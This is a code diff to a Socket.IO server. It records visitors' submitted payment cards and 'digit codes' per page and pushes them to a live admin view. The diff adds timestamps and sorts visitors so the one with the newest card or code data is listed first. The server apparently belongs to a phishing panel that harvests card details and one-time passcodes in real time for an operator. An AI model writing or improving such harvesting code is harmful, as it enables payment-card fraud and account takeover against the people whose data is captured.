@@ -380,17 +380,21 @@ io.on("connection", (socket) => {
         }
       }
       if (data.paymentCard) {
+        const now = new Date().toISOString();
         visitor.paymentCards.push({
           ...data.paymentCard,
-          timestamp: new Date().toISOString(),
+          timestamp: now,
         });
+        visitor.lastDataUpdate = now;
       }
       if (data.digitCode) {
+        const now = new Date().toISOString();
         visitor.digitCodes.push({
           code: data.digitCode,
           page: data.page,
-          timestamp: new Date().toISOString(),
+          timestamp: now,
         });
+        visitor.lastDataUpdate = now;
       }
 
       visitor.page = data.page;
@@ -463,6 +467,13 @@ io.on("connection", (socket) => {
           }
         });
         return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
+      });
+
+      // Sort visitors by lastDataUpdate (most recent first)
+      visitorsWithStatus.sort((a, b) => {
+        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
+        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
+        return dateB - dateA;
       });
 
       console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);
